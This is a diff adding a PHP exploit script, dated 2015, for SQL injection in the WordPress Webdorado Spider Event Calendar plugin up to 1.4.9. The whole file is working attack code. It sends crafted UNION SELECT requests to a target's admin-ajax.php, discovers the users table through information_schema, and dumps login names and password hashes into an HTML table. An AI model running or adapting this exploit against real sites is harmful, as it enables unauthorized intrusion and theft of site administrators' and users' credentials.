@@ -1,0 +1,85 @@
+<?php
+ 
+/*
+
+# Exploit Title: WordPress: Webdorado Spider Event Calendar <= 1.4.9  [SQL Injection]
+# Date: 2015-02-12
+# Exploit Author: Mateusz Lach
+# Vendor Homepage: https://www.facebook.com/WebDorado or http://www.webdorado.com
+# Software Link: https://downloads.wordpress.org/plugin/spider-event-calendar.1.4.9.zip
+# Version: 1.4.9
+# Tested on: OpenSUSE Linux + Chrome and Firefox, it's PHP application.
+# CVE : CWE-89
+# OWASP Top10: A1-Injection
+
+
+ This program is free software: you can redistribute it and/or modify
+    it under the terms of the GNU General Public License as published by
+    the Free Software Foundation, either version 3 of the License, or
+    (at your option) any later version.
+ 
+    This program is distributed in the hope that it will be useful,
+    but WITHOUT ANY WARRANTY; without even the implied warranty of
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    GNU General Public License for more details.
+ 
+    You should have received a copy of the GNU General Public License
+    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ 
+    # Exploit Title: WordPress: Webdorado Spider Event Calendar <= 1.4.9 [SQL Injection]
+    # Date: 2015-02-12
+    # Exploit Author: Mateusz Lach
+    # Vendor Homepage: https://www.facebook.com/WebDorado or http://www.webdorado.com
+    # Software Link: https://downloads.wordpress.org/plugin/spider-event-calendar.1.4.9.zip
+    # Version: 1.4.9
+    # Tested on: OpenSUSE Linux + Chrome and Firefox, it's PHP application.
+    # CVE : CWE-89
+    # OWASP Top10: A1-Injection
+ */
+ 
+define('FETCH_PREFIX_URL', 'http://%s/wp-admin/admin-ajax.php?action=spiderbigcalendar_month&theme_id=13&calendar=1&select=month,list,week,day,&date=2015-02&many_sp_calendar=1&cur_page_url=%s&cat_id=1)%%20UNION%%20SELECT%%20%s,1,%%20FROM_UNIXTIME(1423004400),1,(SELECT%%20CONCAT(CHAR(35,35,35,35),table_name,CHAR(35,35,35,35))%%20FROM%%20information_schema.tables%%20WHERE%%20table_name%%20LIKE%%20(%%20SELECT%%20CHAR(37,%%20117,%%20115,%%20101,%%20114,%%20115)%%20)%%20LIMIT%%201),1,1,1,1,%%20CHAR(110,%%20111,%%2095,%%20114,%%20101,%%20112,%%20101,%%2097,%%20116),1,1,1,1,1,1,1,1,1%%20FROM%%20DUAL;--%%20--%%20&widget=0');
+ 
+define('FETCH_USERS_URL', 'http://%s/wp-admin/admin-ajax.php?action=spiderbigcalendar_month&theme_id=13&calendar=1&select=month,list,week,day,&date=2015-02&many_sp_calendar=1&cur_page_url=%s&cat_id=1)%%20UNION%%20SELECT%%20%s,1,%%20FROM_UNIXTIME(1423004400),1,%%20CONCAT(CHAR(35,33,35,33,35,33,35),GROUP_CONCAT(%%20CONCAT(%%20CONCAT(user_login,CHAR(35,%%2035),user_pass))),CHAR(35,33,35,33,35,33,35)),%%201,1,1,1,%%20CHAR(110,%%20111,%%2095,%%20114,%%20101,%%20112,%%20101,%%2097,%%20116),1,1,1,1,1,1,1,1,1%%20as%%20fakeGroup%%20FROM%%20%s%%20GROUP%%20BY%%20fakeGroup;--%%20&widget=0');
+ 
+define('FAKE_ID_TO_SEARCH', 12345677654321);
+define('PATTERN_TO_SEARCH', 'ev_ids='.FAKE_ID_TO_SEARCH);
+define('PATTERN_TO_SEARCH_USERS', '#!#!#!#');
+define('ROW_SEPARATOR', ',');
+define('FIELD_SEPARATOR', '##');
+$server = $_GET['SRV'];
+if (empty($server))
+{
+    echo 'Please put server (without protocol) name in SRV GET variable!';
+}
+else
+{
+    $fullURL = sprintf(FETCH_PREFIX_URL, $server, $server, FAKE_ID_TO_SEARCH);
+    $prefixCurl = curl_init($fullURL);
+    curl_setopt($prefixCurl, CURLOPT_RETURNTRANSFER, true);
+    $result = curl_exec($prefixCurl);
+    if (stripos($result, PATTERN_TO_SEARCH) !== false)
+    {
+        preg_match('/####[a-zA-Z\_0-9]*####/', $result, $tableNames);
+        $tableName = str_replace('####', '', $tableNames[0]);
+        echo 'tableName: '.$tableName.'<BR/>';
+        $fullURL = sprintf(FETCH_USERS_URL, $server, $server, FAKE_ID_TO_SEARCH, $tableName);
+        $usersCurl = curl_init($fullURL);
+        curl_setopt($usersCurl, CURLOPT_RETURNTRANSFER, true);
+        $result = curl_exec($usersCurl);  
+        if (stripos($result, PATTERN_TO_SEARCH) !== false)
+        {
+            $from = stripos($result, PATTERN_TO_SEARCH_USERS);
+            $to = stripos($result, PATTERN_TO_SEARCH_USERS, $from + strlen(PATTERN_TO_SEARCH_USERS));
+            $result = substr($result, $from, $to-$from);
+            echo '<table><tr><td>'.str_replace(FIELD_SEPARATOR, '</td><td>', str_replace(ROW_SEPARATOR, '</td></tr><tr><td>', str_replace(PATTERN_TO_SEARCH_USERS, '', $result))).'</td></tr></table>';
+        }
+        else
+        {
+            echo 'Table name fetched, but not users - try to rewrite exploit :-(';
+        }
+    }
+    else
+    {
+        echo 'NOT vulnerable :-(';
+    }
+} 
